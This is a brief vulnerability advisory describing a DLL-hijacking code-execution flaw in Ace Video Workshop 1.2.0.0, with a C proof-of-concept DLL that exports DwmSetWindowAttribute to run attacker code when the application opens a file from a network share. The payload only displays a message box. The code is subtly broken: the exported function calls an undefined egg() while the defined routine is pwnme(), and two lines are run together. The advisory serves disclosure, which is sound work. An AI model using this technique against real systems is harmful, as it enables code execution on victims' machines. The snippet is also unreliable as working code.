Ace Video Workshop is prone to an arbitrary-code-execution vulnerability.

An attacker can exploit this issue by enticing a legitimate user to use the vulnerable application to open a file from a network share location that contains a specially crafted Dynamic Link Library (DLL) file.

Ace Video Workshop 1.2.0.0 is vulnerable; other versions may also be affected.

#include <windows.h>
#define DllExport __declspec (dllexport) DllExport void DwmSetWindowAttribute() { egg();}

int pwnme()
{
MessageBox(0, "dll hijacked !! ", "Dll Message", MB_OK);
exit(0);
return 0;
}
